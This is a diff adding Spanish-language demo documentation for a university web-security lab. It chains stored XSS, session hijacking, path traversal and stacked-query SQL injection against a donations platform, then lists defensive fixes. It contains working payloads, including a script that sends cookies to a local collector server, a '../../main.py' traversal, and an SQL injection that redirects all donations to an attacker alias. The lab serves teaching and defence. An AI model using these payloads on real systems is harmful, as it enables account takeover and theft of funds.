@@ -1,0 +1,63 @@
+# Documentación de Demo: Trabajo Práctico de Seguridad Web
+**Proyecto:** Plataforma de Donaciones Comunitarias
+**Objetivo de la Demostración:** Ejecutar una cadena de ataque completa (Kill Chain) explotando 4 vulnerabilidades concatenadas de OWASP Top 10, culminando en el desvío total de los fondos de la plataforma.
+
+---
+
+## 🎭 Roles de la Demostración
+Para el laboratorio en vivo, se utilizarán dos navegadores o perfiles distintos para representar las vistas:
+* **Atacante:** Usuario registrado estándar (ej. `martin`) operando desde un navegador (ej. Firefox).
+* **Víctima (Administrador):** Usuario con máximos privilegios (`admin`) operando desde otro navegador (ej. Chrome).
+
+---
+
+## ⛓️ Flujo de la Cadena de Ataque (Kill Chain)
+
+### Paso 1: Infección Inicial (A03:2021 - Injection / Stored XSS)
+* **Objetivo:** Plantar un script malicioso en la plataforma que se ejecute en el navegador de otros usuarios.
+* **Acción del Atacante:** 1. Inicia sesión como usuario normal.
+    2. Navega a una petición popular (ej. "Jornada comunitaria para limpiar el Riachuelo").
+    3. En la sección de comentarios, inserta el siguiente payload que simula el robo de cookies hacia un servidor controlado por el atacante:
+       `<script>fetch('http://127.0.0.1:9000/log?cookie=' + document.cookie)</script>`
+    4. Envía el comentario.
+* **Impacto Visual:** El comentario malicioso queda almacenado en la base de datos (Stored XSS). A simple vista en el frontend, el script es invisible.
+
+### Paso 2: Secuestro de Sesión (A07:2021 - Identification and Authentication Failures)
+* **Objetivo:** Escalar privilegios a Administrador sin conocer sus credenciales.
+* **Acción de la Víctima (Admin):**
+    1. El administrador inicia sesión para moderar la plataforma.
+    2. Ingresa a la petición del "Riachuelo" para revisar la actividad reciente.
+* **La Ejecución:** Al renderizarse la página, el navegador del Admin ejecuta el script oculto del Paso 1. Como la cookie de sesión no tiene el flag `HttpOnly`, el script logra leer `document.cookie` y enviarla al servidor del atacante.
+* **Acción del Atacante:**
+    1. Recibe el token de sesión del administrador en su consola.
+    2. Abre las herramientas de desarrollador en su navegador (F12 > Almacenamiento > Cookies) y reemplaza su propio token de sesión por el robado.
+    3. Recarga la página. **Ahora tiene acceso al botón y panel de `/admin`**.
+
+### Paso 3: Reconocimiento Interno (A05:2021 - Security Misconfiguration / Path Traversal)
+* **Objetivo:** Entender la arquitectura del sistema para preparar un ataque financiero preciso.
+* **Acción del Atacante (como Admin):**
+    1. En el panel de administrador, identifica la funcionalidad legítima de "Descarga de Logs de Actividad".
+    2. Intercepta la petición de descarga (o modifica la URL directamente) alterando el parámetro `?file=activity.log`.
+    3. Inyecta el payload de Path Traversal para retroceder directorios: `?file=../../main.py`.
+* **Impacto Visual:** El atacante logra descargar el código fuente del backend. 
+* **Descubrimiento Clave:** Al inspeccionar el código, descubre un endpoint heredado y oculto (`/api/v2/legacy_mark_reviewed_77x9a`) que utiliza la función `executescript()` de SQLite de forma insegura.
+
+### Paso 4: Desvío de Fondos (A03:2021 - Injection / Stacked Queries SQLi)
+* **Objetivo:** Alterar los alias bancarios del frontend para robar las donaciones de los usuarios legítimos.
+* **Acción del Atacante:**
+    1. Abre una herramienta como Postman o usa la consola del navegador para armar una petición POST manual dirigida al endpoint oculto descubierto en el Paso 3.
+    2. El endpoint espera un `petition_id`. Como el código backend ejecuta múltiples instrucciones SQL separadas por punto y coma, el atacante inyecta el siguiente payload de consultas apiladas (Stacked Queries):
+       `1; UPDATE petitions SET bank_alias = 'ATACANTE.MP'; --`
+    3. Envía el POST.
+* **La Ejecución en Base de Datos:** El motor de SQLite ejecuta primero la actualización inofensiva sobre el ID 1, e inmediatamente después ejecuta el `UPDATE` masivo, sobrescribiendo los alias de toda la tabla.
+* **Impacto Visual Final:** El atacante recarga el inicio de la plataforma y abre cualquier petición. El botón azul de "Donar externamente", que antes apuntaba a las cuentas de las ONGs, ahora redirige todos los pagos a `ATACANTE.MP`. **El sistema está completamente comprometido.**
+
+---
+
+## 🛡️ Conclusiones Preventivas (Resumen para la Defensa)
+*Esta sección conecta el ataque con las buenas prácticas requeridas por la cátedra.*
+
+1.  **Contra XSS:** Implementar motores de plantillas que escapen caracteres HTML por defecto (context-aware encoding) antes de renderizar entradas de usuarios.
+2.  **Contra Session Hijacking:** Configurar las cookies de sesión con los atributos `HttpOnly` (evita lectura por JS), `Secure` (solo viaja por HTTPS) y `SameSite=Strict`.
+3.  **Contra Path Traversal:** Validar estrictamente los nombres de archivos solicitados usando *allow-lists* o verificando que el *path* resuelto se encuentre dentro del directorio permitido usando funciones canónicas del SO.
+4.  **Contra SQL Injection:** Abandonar la concatenación de *strings* y utilizar exclusivamente Consultas Parametrizadas (Prepared Statements) u ORMs para interactuar con la base de datos, separando siempre los comandos de los datos.
